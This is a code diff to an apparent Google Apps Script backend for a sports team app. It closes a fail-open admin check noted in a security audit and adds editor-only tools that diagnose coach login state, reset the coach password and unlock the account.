+     mental-prep 資料。逐鍵的長度限制與欄位白名單擋不住核心問題：身分是假的。
+     下方的 setAppData() 會經過 checkAdminKey()，已改為 fail closed（見 B-04）。
+  */
   return setAppData(data.key, data.value, data);
 }
 
@@ -3786,14 +3921,22 @@ function verifyAdmin(data) {
   return result;
 }
 
-// 驗證管理密碼（若有設定 ADMIN_KEY）
+/*
+   驗證管理權限。
+
+   ⚠️ 安全性變更（資安稽核 B-04，P0）：原本在 ADMIN_KEY 未設定時 `return true`，
+   也就是「沒設密碼 = 誰都是管理員」。ADMIN_KEY 預設就是沒設定的，因此
+   pushLineText / setLineConfigFromRequest / setRoster 這些動作等同於完全公開
+   （setRoster 會整份覆寫選手名單）。安全的預設值必須是拒絕，不是放行。
+
+   現在唯一的通過條件是：具備有效的教練 session，或提供正確的 ADMIN_KEY。
+*/
 function checkAdminKey(data) {
   var session = getAuthSession(data);
   if (session && session.role === 'coach') return true;
-  if (!legacyLoginEnabled()) return false;
   var key = getProp('ADMIN_KEY');
-  if (!key) return true; // 未設定密碼則不檢查
-  return data && data.adminKey === key;
+  if (!key) return false;                       // 未設定密碼 → 一律拒絕（不再 fail open）
+  return !!(data && data.adminKey && safeEqual(String(data.adminKey), String(key)));
 }
 
 // 設定本週之星開關（教練端，可用 ADMIN_KEY 保護）
@@ -3864,4 +4007,137 @@ function handleLineWebhook(body) {
   } catch (e) { /* 忽略，Webhook 一律回 200 */ }
   // LINE 要求 Webhook 回 200
   return ContentService.createTextOutput('OK');
+}
+
+/* ============================================================
+   登入救援工具（僅供在 Apps Script 編輯器手動執行）
+
+   ⚠️ 這三個函式**刻意沒有接進 handleAction**，因此無法從 /exec 網址、
+   也無法從前端呼叫。唯一的執行方式是打開這個 Apps Script 專案、
+   在函式下拉選單選取後按「執行」—— 也就是需要具備專案的 Google 帳號權限。
+   請不要把它們加進 handleAction 的 switch。
+   ============================================================ */
+
+/*
+   一、診斷：回答「教練為什麼登不進去」。
+   在編輯器選 diagnoseAuthState → 執行 → 看「執行記錄」。
+   不會輸出任何密碼或雜湊本身，只輸出「有沒有、長度多少」。
+*/
+function diagnoseAuthState() {
+  var out = { checkedAt: nowIso() };
+
+  // 1. 這個專案到底連到哪一張試算表？（判斷是否貼到了錯誤／全新的專案）
+  try {
+    var ss = getSpreadsheet_();
+    out.spreadsheetName = ss.getName();
+    out.spreadsheetId = ss.getId();
+    out.spreadsheetUrl = ss.getUrl();
+    out.sheets = ss.getSheets().map(function (s) { return s.getName() + ' (' + s.getLastRow() + ' 列)'; });
+  } catch (e) {
+    out.spreadsheetError = String(e);
+  }
+
+  // 2. records 有幾筆？（教練後台讀不到資料時，先確認資料本身還在）
+  try {
+    var rec = getSheet();
+    out.recordsRows = rec.getLastRow() - 1;
+    out.recordsCols = rec.getLastColumn();
+  } catch (e) {
+    out.recordsError = String(e);
+  }
+
+  // 3. 教練帳號狀態
+  try {
+    var setting = getCoachSetting();
+    var o = setting.object;
+    var until = o.lockedUntil ? new Date(o.lockedUntil).getTime() : 0;
+    out.coach = {
+      coachId: o.coachId || '(空)',
+      teamId: o.teamId || '(空)',
+      有設定密碼雜湊: !!o.coachPasswordHash,
+      密碼雜湊長度: String(o.coachPasswordHash || '').length,   // 正常應為 64
+      連續失敗次數: Number(o.failedLoginCount || 0),
+      鎖定到: o.lockedUntil || '(未鎖定)',
+      目前是否被鎖: !!(until && until > Date.now())
+    };
+  } catch (e) {
+    out.coachError = String(e);
+  }
+
+  // 4. 關鍵 Script Properties（只看有沒有，不輸出內容）
+  out.props = {
+    有_AUTH_SALT: !!getProp('AUTH_SALT'),          // 若為 false，代表所有既有雜湊都已失效
+    有_ADMIN_KEY: !!getProp('ADMIN_KEY'),          // 教練首次遷移登入的備援密碼
+    LEGACY_LOGIN_ENABLED: getProp('LEGACY_LOGIN_ENABLED') || '(未設定＝關閉)',
+    舊制登入目前狀態: legacyLoginEnabled() ? '開啟' : '關閉'
+  };
+
+  // 5. 選手帳號概況（判斷明天有多少人會登不進去）
+  try {
+    var accounts = readSheetObjects(getStudentAccountsSheet(), STUDENT_ACCOUNT_HEADERS);
+    var withPin = 0, pending = 0, disabled = 0;
+    accounts.forEach(function (a) {
+      if (a.accountStatus === 'disabled') disabled++;
+      else if (a.pinHash) withPin++;
+      else pending++;
+    });
+    out.students = { 總數: accounts.length, 已設PIN可登入: withPin, 尚未啟用: pending, 已停用: disabled };
+  } catch (e) {
+    out.studentsError = String(e);
+  }
+
+  Logger.log(JSON.stringify(out, null, 2));
+  return out;
+}
+
+/*
+   二、重設教練密碼。
+
+   用法：把下面 NEW_COACH_PASSWORD 換成你要用的新密碼 → 存檔 →
+        函式下拉選 resetCoachPasswordFromEditor → 執行 → 看執行記錄確認成功
+        → 改回 '' 再存檔一次（不要把密碼留在程式碼裡）。
+
+   這會一併清掉失敗次數與鎖定狀態。不需要重新部署，改完就能用。
+*/
+function resetCoachPasswordFromEditor() {
+  var NEW_COACH_PASSWORD = '';   // ← 在這裡填新密碼，執行完請清空
+
+  var pwd = String(NEW_COACH_PASSWORD || '');
+  if (!pwd) {
+    var e1 = '❌ 尚未執行任何變更：NEW_COACH_PASSWORD 還是空字串。'
+      + '請把上面那行改成 var NEW_COACH_PASSWORD = \'你的新密碼\'; 存檔後再執行一次。';
+    Logger.log(e1);
+    return e1;
+  }
+  if (pwd.length < 6) {
+    var e2 = '❌ 尚未執行任何變更：教練密碼請至少 6 個字元'
+      + '（這組密碼可以看到全隊的健康與心理資料）。目前長度 = ' + pwd.length;
+    Logger.log(e2);
+    return e2;
+  }
+
+  var setting = getCoachSetting();
+  var account = setting.object;
+  updateObjectRow(setting.sheet, COACH_SETTING_HEADERS, setting.row, {
+    coachPasswordHash: hashSecret('coach:' + account.coachId, pwd),
+    failedLoginCount: 0,
+    lockedUntil: '',
+    updatedAt: nowIso()
+  });
+  var msg = '✅ 教練密碼已重設完成，可以直接用新密碼登入了。請把 NEW_COACH_PASSWORD 清空後存檔。';
+  Logger.log(msg);
+  return msg;
+}
+
+/*
+   三、只解鎖、不改密碼（連續輸錯 5 次被鎖 10 分鐘時用）。
+*/
+function unlockCoachLoginFromEditor() {
+  var setting = getCoachSetting();
+  updateObjectRow(setting.sheet, COACH_SETTING_HEADERS, setting.row, {
+    failedLoginCount: 0, lockedUntil: '', updatedAt: nowIso()
+  });
+  var msg = '✅ 教練登入鎖定已解除。';
+  Logger.log(msg);
+  return msg;
 }
